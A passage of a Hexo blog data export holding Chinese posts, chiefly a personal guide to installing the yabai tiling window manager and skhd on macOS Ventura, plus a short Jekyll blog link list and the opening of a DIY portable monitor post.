Monterey，但我还是想试一下最新的 Ventura 能不能安装使用一下。\n\n<!--more-->\n\n# 准备工作\n\n## 关闭 SIP（系统完整性保护）\n\n> m 系列芯片的我不知道为什么重启的时候快捷键不能进恢复模式 😣\n\n1. 关机，长按关机键直到出现 HD 盘和选项界面\n2. 选择选项，选择用户，输入密码\n3. 左上角实用工具-终端\n4. 输入`csrutil disable`，回车，输入 y 并回车，输入密码\n5. 输入`csrutil status`，查看是否关闭\n6. 重启电脑\n\n## 最好使用 homebrew 进行安装，更便捷\n\n# 安装\n\n1. 安装 yabai\n\n```bash\nbrew install koekeishiya/formulae/yabai --HEAD\n```\n\n2. 安装 skhd\n\n```bash\nbrew install koekeishiya/formulae/skhd\n```\n\n3. 安装 jq - 主要在寻找桌面和显示器的时候使用\n\n```bash\nbrew install jq\n```\n\n3. 生成证书\n\n根据官方文档，想运行最新版的 yabai，需要生成一个自签名证书\n\n> First, open Keychain Access.app. In its menu, navigate to Keychain Access, then\n> Certificate Assistance, then click Create a Certificate.... This will open the\n> Certificate Assistant. Choose these options:\n>\n> Name: yabai-cert,\n> Identity Type: Self-Signed Root\n> Certificate Type: Code Signing\n>\n> Click Create, then Continue to create the certificate.\n\n```bash\ncodesign -fs 'yabai-cert' $(which yabai)\n```\n\n4. 安装完需要执行以下命令\n\n```bash\n# 执行install出错，提示not a valid option，但我看其他人的教程都需要执行这个，暂时不知道什么影响\n#sudo yabai --install-sa\n\n# load就可以\nsudo yabai --load-sa\n\n# 如果load提示没有nvram boot-args，执行如下命令\nsudo nvram boot-args=-arm64e_preview_abi\n```\n\n# 配置\n\n1. 创建 yabai 和 skhd 的配置文件\n\n```bash\nmkdir ~/.config/yabai\n\n# yabai\n# 注意，在.config 下的话，用的是 yabairc 没有.\ncp /opt/homebrew/share/yabai/examples/yabairc ~/config/yabai/yabairc\n\nchmod u+x ~/config/yabai/yabairc\n\n# skhd\ncp /opt/homebrew/share/yabai/examples/skhdrc ~/.skhdrc\n```\n\n2. 启动 yabai 和 skhd\n\n```bash\n# start yabai\nyabai --start-service\n\n# start skhd\nskhd --start-service\n```\n\n# 自启动加载策略\n\n```bash\nsudo visudo -f /private/etc/sudoers.d/yabai\n\n# 然后输入一下内容，其中 <user>为当前 mac 的用户名\n<user> ALL = (root) NOPASSWD: /usr/local/bin/yabai --load-sa\n\n\n# 之后在 yabairc 将以下命令取消注释\nyabai -m signal --add event=dock_did_restart action=\"sudo yabai --load-sa\"\nsudo yabai --load-sa\n```\n\n# 总结\n\n平铺式桌面现在感觉用得很不错，但是快捷键设置不习惯，而且抄的博主的快捷键似乎有部份按了没反应，后续再看看怎么回事。\n\n# 参考文章\n\n- [macbook air m1 芯片关闭 sip 教程（超详细，防踩坑）](https://blog.csdn.net/weixin_44791976/article/details/110826057)\n- [Mac 下的平铺式桌面 - Yabai](https://www.cnblogs.com/tdg-yyx/p/15972309.html)\n- [codesign 命令 error: The specified item could not be found in the keychain](https://blog.csdn.net/Carrgan/article/details/104441967)\n- [Installing yabai (from HEAD)](<https://github.com/koekeishiya/yabai/wiki/Installing-yabai-(from-HEAD)#configure-scripting-addition>)\n- [macOS 13 Ventura #1297](https://github.com/koekeishiya/yabai/issues/1297)\n","source":"_posts/2023/06/macOS平铺式桌面尝鲜.md","raw":"---\nlayout: pages\ntitle: macOS平铺式桌面尝鲜\ndate: 2023-06-24 19:54:24\ntags:\n  - 配置\n  - macOS\ncategories:\n  - 配置\n  - macOS\n---\n\n在使用了 sway 桌面后，我觉得平铺式桌面好像更好，不会说需要想办法调整打开的窗口布局，然后在 b 站刷到了关注的 up 主介绍的 macOS 上的平铺式桌面 yabai，虽然官方文档写的是最新支持到 Monterey，但我还是想试一下最新的 Ventura 能不能安装使用一下。\n\n<!--more-->\n\n# 准备工作\n\n## 关闭 SIP（系统完整性保护）\n\n> m 系列芯片的我不知道为什么重启的时候快捷键不能进恢复模式 😣\n\n1. 关机，长按关机键直到出现 HD 盘和选项界面\n2. 选择选项，选择用户，输入密码\n3. 左上角实用工具-终端\n4. 输入`csrutil disable`，回车，输入 y 并回车，输入密码\n5. 输入`csrutil status`，查看是否关闭\n6. 重启电脑\n\n## 最好使用 homebrew 进行安装，更便捷\n\n# 安装\n\n1. 安装 yabai\n\n```bash\nbrew install koekeishiya/formulae/yabai --HEAD\n```\n\n2. 安装 skhd\n\n```bash\nbrew install koekeishiya/formulae/skhd\n```\n\n3. 安装 jq - 主要在寻找桌面和显示器的时候使用\n\n```bash\nbrew install jq\n```\n\n3. 生成证书\n\n根据官方文档，想运行最新版的 yabai，需要生成一个自签名证书\n\n> First, open Keychain Access.app. In its menu, navigate to Keychain Access, then\n> Certificate Assistance, then click Create a Certificate.... This will open the\n> Certificate Assistant. Choose these options:\n>\n> Name: yabai-cert,\n> Identity Type: Self-Signed Root\n> Certificate Type: Code Signing\n>\n> Click Create, then Continue to create the certificate.\n\n```bash\ncodesign -fs 'yabai-cert' $(which yabai)\n```\n\n4. 安装完需要执行以下命令\n\n```bash\n# 执行install出错，提示not a valid option，但我看其他人的教程都需要执行这个，暂时不知道什么影响\n#sudo yabai --install-sa\n\n# load就可以\nsudo yabai --load-sa\n\n# 如果load提示没有nvram boot-args，执行如下命令\nsudo nvram boot-args=-arm64e_preview_abi\n```\n\n# 配置\n\n1. 创建 yabai 和 skhd 的配置文件\n\n```bash\nmkdir ~/.config/yabai\n\n# yabai\n# 注意，在.config 下的话，用的是 yabairc 没有.\ncp /opt/homebrew/share/yabai/examples/yabairc ~/config/yabai/yabairc\n\nchmod u+x ~/config/yabai/yabairc\n\n# skhd\ncp /opt/homebrew/share/yabai/examples/skhdrc ~/.skhdrc\n```\n\n2. 启动 yabai 和 skhd\n\n```bash\n# start yabai\nyabai --start-service\n\n# start skhd\nskhd --start-service\n```\n\n# 自启动加载策略\n\n```bash\nsudo visudo -f /private/etc/sudoers.d/yabai\n\n# 然后输入一下内容，其中 <user>为当前 mac 的用户名\n<user> ALL = (root) NOPASSWD: /usr/local/bin/yabai --load-sa\n\n\n# 之后在 yabairc 将以下命令取消注释\nyabai -m signal --add event=dock_did_restart action=\"sudo yabai --load-sa\"\nsudo yabai --load-sa\n```\n\n# 总结\n\n平铺式桌面现在感觉用得很不错，但是快捷键设置不习惯，而且抄的博主的快捷键似乎有部份按了没反应，后续再看看怎么回事。\n\n# 参考文章\n\n- [macbook air m1 芯片关闭 sip 教程（超详细，防踩坑）](https://blog.csdn.net/weixin_44791976/article/details/110826057)\n- [Mac 下的平铺式桌面 - Yabai](https://www.cnblogs.com/tdg-yyx/p/15972309.html)\n- [codesign 命令 error: The specified item could not be found in the keychain](https://blog.csdn.net/Carrgan/article/details/104441967)\n- [Installing yabai (from HEAD)](<https://github.com/koekeishiya/yabai/wiki/Installing-yabai-(from-HEAD)#configure-scripting-addition>)\n- [macOS 13 Ventura #1297](https://github.com/koekeishiya/yabai/issues/1297)\n","slug":"2023/06/macOS平铺式桌面尝鲜","published":1,"updated":"2023-06-24T12:55:10.286Z","comments":1,"photos":[],"link":"","_id":"clyh3xcj0000pzge31ihtb6g1","content":"<p>在使用了 sway 桌面后，我觉得平铺式桌面好像更好，不会说需要想办法调整打开的窗口布局，然后在 b 站刷到了关注的 up 主介绍的 macOS 上的平铺式桌面 yabai，虽然官方文档写的是最新支持到 Monterey，但我还是想试一下最新的 Ventura 能不能安装使用一下。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h1><h2 id=\"关闭-SIP（系统完整性保护）\"><a href=\"#关闭-SIP（系统完整性保护）\" class=\"headerlink\" title=\"关闭 SIP（系统完整性保护）\"></a>关闭 SIP（系统完整性保护）</h2><blockquote>\n<p>m 系列芯片的我不知道为什么重启的时候快捷键不能进恢复模式 😣</p>\n</blockquote>\n<ol>\n<li>关机，长按关机键直到出现 HD 盘和选项界面</li>\n<li>选择选项，选择用户，输入密码</li>\n<li>左上角实用工具-终端</li>\n<li>输入<code>csrutil disable</code>，回车，输入 y 并回车，输入密码</li>\n<li>输入<code>csrutil status</code>，查看是否关闭</li>\n<li>重启电脑</li>\n</ol>\n<h2 id=\"最好使用-homebrew-进行安装，更便捷\"><a href=\"#最好使用-homebrew-进行安装，更便捷\" class=\"headerlink\" title=\"最好使用 homebrew 进行安装，更便捷\"></a>最好使用 homebrew 进行安装，更便捷</h2><h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><ol>\n<li>安装 yabai</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install koekeishiya/formulae/yabai --HEAD</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>安装 skhd</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install koekeishiya/formulae/skhd</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>安装 jq - 主要在寻找桌面和显示器的时候使用</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install jq</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>生成证书</li>\n</ol>\n<p>根据官方文档，想运行最新版的 yabai，需要生成一个自签名证书</p>\n<blockquote>\n<p>First, open Keychain Access.app. In its menu, navigate to Keychain Access, then<br>Certificate Assistance, then click Create a Certificate…. This will open the<br>Certificate Assistant. Choose these options:</p>\n<p>Name: yabai-cert,<br>Identity Type: Self-Signed Root<br>Certificate Type: Code Signing</p>\n<p>Click Create, then Continue to create the certificate.</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">codesign -fs <span class=\"string\">&#x27;yabai-cert&#x27;</span> $(<span class=\"built_in\">which</span> yabai)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>安装完需要执行以下命令</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 执行install出错，提示not a valid option，但我看其他人的教程都需要执行这个，暂时不知道什么影响</span></span><br><span class=\"line\"><span class=\"comment\">#sudo yabai --install-sa</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># load就可以</span></span><br><span class=\"line\">sudo yabai --load-sa</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 如果load提示没有nvram boot-args，执行如下命令</span></span><br><span class=\"line\">sudo nvram boot-args=-arm64e_preview_abi</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><ol>\n<li>创建 yabai 和 skhd 的配置文件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> ~/.config/yabai</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># yabai</span></span><br><span class=\"line\"><span class=\"comment\"># 注意，在.config 下的话，用的是 yabairc 没有.</span></span><br><span class=\"line\"><span class=\"built_in\">cp</span> /opt/homebrew/share/yabai/examples/yabairc ~/config/yabai/yabairc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">chmod</span> u+x ~/config/yabai/yabairc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># skhd</span></span><br><span class=\"line\"><span class=\"built_in\">cp</span> /opt/homebrew/share/yabai/examples/skhdrc ~/.skhdrc</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>启动 yabai 和 skhd</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># start yabai</span></span><br><span class=\"line\">yabai --start-service</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># start skhd</span></span><br><span class=\"line\">skhd --start-service</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"自启动加载策略\"><a href=\"#自启动加载策略\" class=\"headerlink\" title=\"自启动加载策略\"></a>自启动加载策略</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo visudo -f /private/etc/sudoers.d/yabai</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 然后输入一下内容，其中 &lt;user&gt;为当前 mac 的用户名</span></span><br><span class=\"line\">&lt;user&gt; ALL = (root) NOPASSWD: /usr/local/bin/yabai --load-sa</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 之后在 yabairc 将以下命令取消注释</span></span><br><span class=\"line\">yabai -m signal --add event=dock_did_restart action=<span class=\"string\">&quot;sudo yabai --load-sa&quot;</span></span><br><span class=\"line\">sudo yabai --load-sa</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>平铺式桌面现在感觉用得很不错，但是快捷键设置不习惯，而且抄的博主的快捷键似乎有部份按了没反应，后续再看看怎么回事。</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://blog.csdn.net/weixin_44791976/article/details/110826057\">macbook air m1 芯片关闭 sip 教程（超详细，防踩坑）</a></li>\n<li><a href=\"https://www.cnblogs.com/tdg-yyx/p/15972309.html\">Mac 下的平铺式桌面 - Yabai</a></li>\n<li><a href=\"https://blog.csdn.net/Carrgan/article/details/104441967\">codesign 命令 error: The specified item could not be found in the keychain</a></li>\n<li><a href=\"https://github.com/koekeishiya/yabai/wiki/Installing-yabai-(from-HEAD)#configure-scripting-addition\">Installing yabai (from HEAD)</a></li>\n<li><a href=\"https://github.com/koekeishiya/yabai/issues/1297\">macOS 13 Ventura #1297</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>在使用了 sway 桌面后，我觉得平铺式桌面好像更好，不会说需要想办法调整打开的窗口布局，然后在 b 站刷到了关注的 up 主介绍的 macOS 上的平铺式桌面 yabai，虽然官方文档写的是最新支持到 Monterey，但我还是想试一下最新的 Ventura 能不能安装使用一下。</p>","more":"<h1 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h1><h2 id=\"关闭-SIP（系统完整性保护）\"><a href=\"#关闭-SIP（系统完整性保护）\" class=\"headerlink\" title=\"关闭 SIP（系统完整性保护）\"></a>关闭 SIP（系统完整性保护）</h2><blockquote>\n<p>m 系列芯片的我不知道为什么重启的时候快捷键不能进恢复模式 😣</p>\n</blockquote>\n<ol>\n<li>关机，长按关机键直到出现 HD 盘和选项界面</li>\n<li>选择选项，选择用户，输入密码</li>\n<li>左上角实用工具-终端</li>\n<li>输入<code>csrutil disable</code>，回车，输入 y 并回车，输入密码</li>\n<li>输入<code>csrutil status</code>，查看是否关闭</li>\n<li>重启电脑</li>\n</ol>\n<h2 id=\"最好使用-homebrew-进行安装，更便捷\"><a href=\"#最好使用-homebrew-进行安装，更便捷\" class=\"headerlink\" title=\"最好使用 homebrew 进行安装，更便捷\"></a>最好使用 homebrew 进行安装，更便捷</h2><h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><ol>\n<li>安装 yabai</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install koekeishiya/formulae/yabai --HEAD</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>安装 skhd</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install koekeishiya/formulae/skhd</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>安装 jq - 主要在寻找桌面和显示器的时候使用</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install jq</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>生成证书</li>\n</ol>\n<p>根据官方文档，想运行最新版的 yabai，需要生成一个自签名证书</p>\n<blockquote>\n<p>First, open Keychain Access.app. In its menu, navigate to Keychain Access, then<br>Certificate Assistance, then click Create a Certificate…. This will open the<br>Certificate Assistant. Choose these options:</p>\n<p>Name: yabai-cert,<br>Identity Type: Self-Signed Root<br>Certificate Type: Code Signing</p>\n<p>Click Create, then Continue to create the certificate.</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">codesign -fs <span class=\"string\">&#x27;yabai-cert&#x27;</span> $(<span class=\"built_in\">which</span> yabai)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>安装完需要执行以下命令</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 执行install出错，提示not a valid option，但我看其他人的教程都需要执行这个，暂时不知道什么影响</span></span><br><span class=\"line\"><span class=\"comment\">#sudo yabai --install-sa</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># load就可以</span></span><br><span class=\"line\">sudo yabai --load-sa</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 如果load提示没有nvram boot-args，执行如下命令</span></span><br><span class=\"line\">sudo nvram boot-args=-arm64e_preview_abi</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><ol>\n<li>创建 yabai 和 skhd 的配置文件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> ~/.config/yabai</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># yabai</span></span><br><span class=\"line\"><span class=\"comment\"># 注意，在.config 下的话，用的是 yabairc 没有.</span></span><br><span class=\"line\"><span class=\"built_in\">cp</span> /opt/homebrew/share/yabai/examples/yabairc ~/config/yabai/yabairc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">chmod</span> u+x ~/config/yabai/yabairc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># skhd</span></span><br><span class=\"line\"><span class=\"built_in\">cp</span> /opt/homebrew/share/yabai/examples/skhdrc ~/.skhdrc</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>启动 yabai 和 skhd</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># start yabai</span></span><br><span class=\"line\">yabai --start-service</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># start skhd</span></span><br><span class=\"line\">skhd --start-service</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"自启动加载策略\"><a href=\"#自启动加载策略\" class=\"headerlink\" title=\"自启动加载策略\"></a>自启动加载策略</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo visudo -f /private/etc/sudoers.d/yabai</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 然后输入一下内容，其中 &lt;user&gt;为当前 mac 的用户名</span></span><br><span class=\"line\">&lt;user&gt; ALL = (root) NOPASSWD: /usr/local/bin/yabai --load-sa</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 之后在 yabairc 将以下命令取消注释</span></span><br><span class=\"line\">yabai -m signal --add event=dock_did_restart action=<span class=\"string\">&quot;sudo yabai --load-sa&quot;</span></span><br><span class=\"line\">sudo yabai --load-sa</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>平铺式桌面现在感觉用得很不错，但是快捷键设置不习惯，而且抄的博主的快捷键似乎有部份按了没反应，后续再看看怎么回事。</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://blog.csdn.net/weixin_44791976/article/details/110826057\">macbook air m1 芯片关闭 sip 教程（超详细，防踩坑）</a></li>\n<li><a href=\"https://www.cnblogs.com/tdg-yyx/p/15972309.html\">Mac 下的平铺式桌面 - Yabai</a></li>\n<li><a href=\"https://blog.csdn.net/Carrgan/article/details/104441967\">codesign 命令 error: The specified item could not be found in the keychain</a></li>\n<li><a href=\"https://github.com/koekeishiya/yabai/wiki/Installing-yabai-(from-HEAD)#configure-scripting-addition\">Installing yabai (from HEAD)</a></li>\n<li><a href=\"https://github.com/koekeishiya/yabai/issues/1297\">macOS 13 Ventura #1297</a></li>\n</ul>"},{"title":"Jekyll Blog","date":"2021-03-21T01:00:00.000Z","_content":"\n# 在 GitHub 上创建个人博客\n\n使用 Jekyll 主题并启用 Github Pages 服务创建个人博客\n\n<!--more-->\n\n# 参考文章\n\n- [在 github 上搭建个人博客并在线更新](https://www.cnblogs.com/wxyww/p/xiaoshujiang.html)\n- [jekyll 主题博客](http://jekyllthemes.org/)\n-\n- [三分钟在 GitHub 上搭建个人博客](https://zhuanlan.zhihu.com/p/28321740)\n- [用 GitHub-Pages 搭建博客及 Jekyll 主题设置](https://xienotes.net/2020/04/25/github-pages-and-jekyll.html)\n","source":"_posts/2021/03/jekyll-blog.md","raw":"---\ntitle: Jekyll Blog\ndate: 2021-03-21 09:00:00\ntags:\n  - 博客\ncategories:\n  - 博客\n  - Jekyll\n---\n\n# 在 GitHub 上创建个人博客\n\n使用 Jekyll 主题并启用 Github Pages 服务创建个人博客\n\n<!--more-->\n\n# 参考文章\n\n- [在 github 上搭建个人博客并在线更新](https://www.cnblogs.com/wxyww/p/xiaoshujiang.html)\n- [jekyll 主题博客](http://jekyllthemes.org/)\n-\n- [三分钟在 GitHub 上搭建个人博客](https://zhuanlan.zhihu.com/p/28321740)\n- [用 GitHub-Pages 搭建博客及 Jekyll 主题设置](https://xienotes.net/2020/04/25/github-pages-and-jekyll.html)\n","slug":"2021/03/jekyll-blog","published":1,"updated":"2022-07-23T14:41:42.289Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xcj0000tzge307ua6iag","content":"<h1 id=\"在-GitHub-上创建个人博客\"><a href=\"#在-GitHub-上创建个人博客\" class=\"headerlink\" title=\"在 GitHub 上创建个人博客\"></a>在 GitHub 上创建个人博客</h1><p>使用 Jekyll 主题并启用 Github Pages 服务创建个人博客</p>\n<span id=\"more\"></span>\n\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://www.cnblogs.com/wxyww/p/xiaoshujiang.html\">在 github 上搭建个人博客并在线更新</a></li>\n<li><a href=\"http://jekyllthemes.org/\">jekyll 主题博客</a></li>\n<li></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/28321740\">三分钟在 GitHub 上搭建个人博客</a></li>\n<li><a href=\"https://xienotes.net/2020/04/25/github-pages-and-jekyll.html\">用 GitHub-Pages 搭建博客及 Jekyll 主题设置</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<h1 id=\"在-GitHub-上创建个人博客\"><a href=\"#在-GitHub-上创建个人博客\" class=\"headerlink\" title=\"在 GitHub 上创建个人博客\"></a>在 GitHub 上创建个人博客</h1><p>使用 Jekyll 主题并启用 Github Pages 服务创建个人博客</p>","more":"<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://www.cnblogs.com/wxyww/p/xiaoshujiang.html\">在 github 上搭建个人博客并在线更新</a></li>\n<li><a href=\"http://jekyllthemes.org/\">jekyll 主题博客</a></li>\n<li></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/28321740\">三分钟在 GitHub 上搭建个人博客</a></li>\n<li><a href=\"https://xienotes.net/2020/04/25/github-pages-and-jekyll.html\">用 GitHub-Pages 搭建博客及 Jekyll 主题设置</a></li>\n</ul>"},{"title":"DIY屏幕","date":"2021-03-28T11:00:00.000Z","_content":"\n# 前言\n\n我本来是想买一个屏幕的，也一直在看买哪种屏幕好，主要是我买了一个 SWITCH，想用来放大一点玩游戏，也为以后自主装机时不用再去买一块屏幕，一举多得。但后来仔细一想，宿舍里我桌面上没什么空间放东西，也没插座，想了想就暂时算了，还是以后自己租房攒机时再买。但机缘巧合下我看到了 DIY 屏幕的教程，看了下效果很不错，于是我想来想去还是下单买了需要的材料，话不多说，DIY 开始！\n\n<!--more-->\n\n# 说明\n\n没什么可说的，就照着教程做就行了。\n\n我的屏幕是 14 寸 2k 100 色域的，驱动板配套买的，花了￥ 500 元，这是占大头的部分，\n\n积木我由于不确定要多少所以照着上面链接买的，￥ 120 元，结果因为他是 15.6 寸屏幕，而且我没有把按键板放在边框，所以剩下 10 包白色积木 2 包橙色积木，不过我自觉成品是比他薄一点的（也相对减少了工作量）。\n\n~~东西是这周到的，人是今天走的。~~\n\n建议自己想尝试并且手上有屏幕的去淘宝买个驱动板，没有的就看自己意愿咯。\n\n文章说了，本人也亲自体验过了，真的真的是非常需要耐心，而且积木拼多了手指头痛死了，大拇指和食指指缝的肉分离了一点点，痛了两天，而且估计还要痛下去，十指连心啊。。。\n\n![手指](diy-screen/DIYScreen_my_hand.png '被摧残过的手')\n\n# 过程记录\n\n一小时的成果（由于刚拼积木不熟练），就拼了一个角。\n\n![一小时](diy-screen/DIYScreen_1hour.png '耐心')\n\n一早上的成果，龙猫。\n\n![一早上](diy-screen/DIYScreen_1morning.png '耐心')\n\n一天的成果，背板。\n\n![一天](diy-screen/DIYScreen_1day.png '耐心')\n\n期间自己拼了一下自己的名字，由于黑色拼白色有点不好看而且黑色积木可能不够遂放弃，改用橙色。\n\n![名字](diy-screen/DIYScreen_my_name.png '黑色积木确实不够')\n\n开始放驱动板，往上叠边框，还得压实，太难了。\n\n![快好了](diy-screen/DIYScreen_closing1.png '耐心')\n\n叠好边框放屏幕，前背板本来不想剪的结果试了一下会压到屏幕，还是乖乖剪吧（手好酸）。\n\n![差一点了](diy-screen/DIYScreen_closing2.png '耐心')\n\n# 成果展示\n\n终于终于在第二天完成了，也有空写下这篇文章记录了。\n\n前面\n\n![前面](diy-screen/DIYScreen_finish1.png 'Yay!')\n\n后面\n\n![后面](diy-screen/DIYScreen_finish2.png 'Yay!')\n\n开机\n\n![开机](diy-screen/DIYScreen_finish3.png 'Yay!')\n\n哈哈哈，我的动手能力还是可以的嘛，咱今儿那叫一个高兴！\n\n# 参考文章\n\n- [如何低价 DIY 一个便携式显示器](https://zhuanlan.zhihu.com/p/143726050)\n","source":"_posts/2021/03/diy-screen.md","raw":"---\ntitle: DIY屏幕\ndate: 2021-03-28 19:00:00\ntags:\n  - DIY\ncategories:\n  - DIY\n  - 硬件\n---\n\n# 前言\n\n我本来是想买一个屏幕的，也一直在看买哪种屏幕好，主要是我买了一个 SWITCH，想用来放大一点玩游戏，也为以后自主装机时不用再去买一块屏幕，一举多得。但后来仔细一想，宿舍里我桌面上没什么空间放东西，也没插座，想了想就暂时算了，还是以后自己租房攒机时再买。但机缘巧合下我看到了 DIY 